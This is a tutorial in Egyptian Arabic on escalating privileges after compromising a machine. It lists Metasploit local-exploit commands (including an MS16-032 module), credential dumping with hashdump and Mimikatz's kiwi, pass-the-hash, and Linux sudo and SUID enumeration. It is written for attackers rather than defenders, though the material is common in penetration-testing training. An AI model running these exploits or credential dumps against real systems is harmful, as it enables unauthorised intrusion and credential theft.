# **تصعيد الصلاحيات بعد الاستغلال (Privilege Escalation) – ببساطة!**

## **📌 يعني إيه Privilege Escalation؟**

لما بتستغل ثغرة وتاخد **وصول مبدئي (Initial Access)** على الجهاز المستهدف، ممكن تكون الصلاحيات بتاعتك **محدودة**، يعني مش Administrator أو Root. **تصعيد الصلاحيات (Privilege Escalation)** هو إنك تزوّد صلاحياتك عشان تبقى **مدير النظام** وتقدر تتحكم بشكل كامل في الجهاز.

**📌 مثال بسيط:**  
لو اخترقت جهاز **كـ User عادي**، مش هتقدر توصل لملفات حساسة أو تنفذ أوامر خطيرة، لكن لو قدرت تصعد صلاحياتك لـ **Admin أو SYSTEM**، هتقدر تعمل كل حاجة!

---

## **🔥 طرق تصعيد الصلاحيات بعد الاختراق**

### **🟢 1. استغلال الثغرات في النظام (Kernel Exploits)**

🔹 بعض الأنظمة عندها ثغرات تسمح لك تصعد صلاحياتك مباشرة، زي:  
✅ **DirtyCow** في أنظمة Linux  
✅ **MS10-015** و **MS16-032** في Windows

📌 في **Metasploit**، ممكن تستخدم أوامر البحث عن ثغرات تصعيد الصلاحيات كالتالي:

```bash
search exploit/windows/local
search exploit/linux/local
```

🔹 بعد كده تختار الاستغلال المناسب وتنفذه بنفس أسلوب أي استغلال عادي.

---

### **🟢 2. استخراج كلمات المرور المخزنة (Password Dumping)**

لو قدرت توصل لـ **كلمات المرور**، ممكن تسجل دخول بحساب مسؤول مباشرة! 👀  
📌 في **Meterpreter**، تقدر تستخدم الأوامر دي لسحب كلمات المرور:

```bash
hashdump    # لو عندك صلاحيات SYSTEM في ويندوز
kiwi        # استخدام Mimikatz داخل Meterpreter
```

🔹 ولو عايز تجرب كلمات المرور دي على باقي الأجهزة في الشبكة، استخدم **Pass-the-Hash Attack**!

---

### **🟢 3. استغلال خدمات بتشتغل بصلاحيات عالية (Service Exploits)**

🔹 بعض الخدمات على الجهاز بتشتغل بصلاحيات المسؤول، ولو لقيت خدمة ضعيفة، ممكن تستغلها لتصعيد الصلاحيات.  
📌 في **Metasploit**، جرب تبحث عن استغلال للخدمات كده:

```bash
search exploit/windows/local
```

---

### **🟢 4. التلاعب بالملفات الحساسة (Sudo & SUID in Linux, Misconfigurations in Windows)**

🔹 في Linux، لو لقيت **ملف SUID** أو **أمر عنده صلاحيات sudo** بدون كلمة مرور، تقدر تستخدمه عشان تصعد الصلاحيات.  
📌 جرب تشوف الأوامر اللي تقدر تنفذها بـ sudo بدون باسورد:

```bash
sudo -l
```

🔹 ولو لقيت ملف عنده SUID، شغّله كده عشان تشوف لو يقدر يديك صلاحيات أعلى:

```bash
find / -perm -u=s -type f 2>/dev/null
```

---

## **💡 الخلاصة بالمصري:**

1️⃣ **بعد ما تخترق جهاز، ممكن يكون دخولك بصلاحيات قليلة، وده هيمنعك من تنفيذ حاجات كتير.**  
2️⃣ **فيه طرق كتير لتصعيد الصلاحيات، زي استغلال ثغرات النظام، استخراج كلمات المرور، أو تشغيل أوامر بصلاحيات مرتفعة.**  
3️⃣ **لو انت على ويندوز، استخدم `hashdump` أو `kiwi` لسحب كلمات السر.**  
4️⃣ **لو على لينكس، استخدم `sudo -l` و `find / -perm -u=s` عشان تدور على أوامر ممكن تستخدمها بصلاحيات أعلى.**  
5️⃣ **بعد ما تصعد الصلاحيات، هيكون عندك تحكم كامل في النظام وتقدر تتحرك بحرية أكتر!** 🔥

---

## **🛠️ الخطوات العملية لتصعيد الصلاحيات في Metasploit**

✅ **1. البحث عن ثغرات تصعيد الصلاحيات:**

```bash
search exploit/windows/local
search exploit/linux/local
```

✅ **2. تنفيذ استغلال مناسب:**

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
```

✅ **3. استخراج كلمات المرور:**

```bash
hashdump
kiwi
```

✅ **4. البحث عن خدمات ضعيفة:**

```bash
ps
```

✅ **5. فحص صلاحيات المستخدم:**

```bash
whoami
getuid
```

✅ **6. التحقق من صلاحيات SUDO في Linux:**

```bash
sudo -l
```

✅ **7. البحث عن ملفات SUID في Linux:**

```bash
find / -perm -u=s -type f 2>/dev/null
```

🎯 **بمجرد ما تصعد صلاحياتك، هتتحكم في الجهاز بشكل كامل وتنفذ أي أمر عايزه!** 🔥